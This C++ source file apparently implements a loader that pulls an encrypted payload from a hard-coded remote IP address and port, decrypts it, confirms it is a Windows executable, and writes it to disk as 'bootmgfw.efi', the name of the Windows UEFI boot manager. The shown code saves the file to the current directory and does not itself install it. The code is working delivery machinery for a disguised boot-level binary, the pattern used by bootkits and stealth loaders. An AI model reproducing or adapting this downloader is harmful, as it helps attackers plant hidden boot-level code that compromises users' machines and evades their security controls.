#include "cryptography.h"
#include "request.h"
#include <iostream>
#include <fstream>
#include <filesystem>
#include <nlohmann/json.hpp>
#include <openssl/evp.h>

namespace fs = std::filesystem;
using json = nlohmann::json;

void loadBoot(const std::string& host, const std::string& port) {
    try {
        std::cout << "[INFO ->] attempting connection to /get-array\n";
        std::string rawResponse = sendRequestWithWinsock(host, port, "/get-array");

        if (rawResponse.empty()) {
            throw std::runtime_error("Failed to retrieve data.");
        }

        json responseJson = json::parse(rawResponse);
        std::string encryptedData = responseJson["data"];

        std::cout << "[DEBUG] Encrypted data length: " << encryptedData.length() << std::endl;
        std::cout << "[DEBUG] First 100 chars of encrypted data: " << encryptedData.substr(0, 100) << std::endl;

        std::string decryptedString = decrypt(encryptedData);

        std::cout << "[DEBUG] Decrypted data length: " << decryptedString.length() << std::endl;
        std::cout << "[DEBUG] First 100 chars of decrypted data: " << decryptedString.substr(0, 100) << std::endl;

        if (decryptedString.substr(0, 22) != "unsigned char rawData[") {
            throw std::runtime_error("Decrypted data does not have the expected format.");
        }

        std::vector<unsigned char> bootmgfwData = parseByteArray(decryptedString);

        if (bootmgfwData.empty()) {
            throw std::runtime_error("Failed to extract bytearray data.");
        }

        std::cout << "[INFO ->] Extracted " << bootmgfwData.size() << " bytes\n";

        std::cout << "[DEBUG] First 32 bytes of extracted data:\n";
        for (size_t i = 0; i < std::min(bootmgfwData.size(), size_t(32)); ++i) {
            std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(bootmgfwData[i]) << " ";
            if ((i + 1) % 16 == 0) std::cout << "\n";
        }
        std::cout << std::dec << "\n";

        if (bootmgfwData.size() >= 2 && bootmgfwData[0] == 0x4D && bootmgfwData[1] == 0x5A) {
            std::cout << "[DEBUG] MZ header found in extracted data\n";
        }
        else {
            std::cout << "[DEBUG] MZ header not found in extracted data\n";
        }

        fs::path outputPath = fs::current_path() / "bootmgfw.efi";
        std::ofstream outFile(outputPath, std::ios::binary | std::ios::trunc);
        if (!outFile) {
            throw std::runtime_error("Failed to open file for writing: " + outputPath.string());
        }
        outFile.write(reinterpret_cast<const char*>(bootmgfwData.data()), bootmgfwData.size());
        outFile.close();

        std::cout << "[INFO ->] bootmgfw.efi written to: " << outputPath << "\n";

        std::ifstream checkFile(outputPath, std::ios::binary);
        if (checkFile) {
            std::vector<unsigned char> fileContent((std::istreambuf_iterator<char>(checkFile)), std::istreambuf_iterator<char>());
            std::cout << "[DEBUG] Written file size: " << fileContent.size() << " bytes\n";
            std::cout << "[DEBUG] First 32 bytes of written file:\n";
            for (size_t i = 0; i < std::min(fileContent.size(), size_t(32)); ++i) {
                std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(fileContent[i]) << " ";
                if ((i + 1) % 16 == 0) std::cout << "\n";
            }
            std::cout << std::dec << "\n";

            if (fileContent.size() >= 2 && fileContent[0] == 0x4D && fileContent[1] == 0x5A) {
                std::cout << "[DEBUG] MZ header found in written file\n";
            }
            else {
                std::cout << "[DEBUG] MZ header not found in written file\n";
            }

            if (fileContent.size() != bootmgfwData.size()) {
                std::cerr << "[WARNING] File size mismatch!\n";
            }
        }
        else {
            std::cerr << "[ERROR] Failed to verify written file\n";
        }
    }
    catch (const std::exception& ex) {
        std::cerr << "[ERROR] Workflow failed: " << ex.what() << "\n";
    }
}


//example usage
int main() {
    OPENSSL_init_crypto(OPENSSL_INIT_ADD_ALL_CIPHERS | OPENSSL_INIT_ADD_ALL_DIGESTS, NULL);

    const std::string host = "101.99.76.106";
    const std::string port = "7877";

    std::cout << "[INFO ->] connected to server\n";
    loadBoot(host, port);
    std::cout << "[INFO ->] download completed\n";

    return 0;
}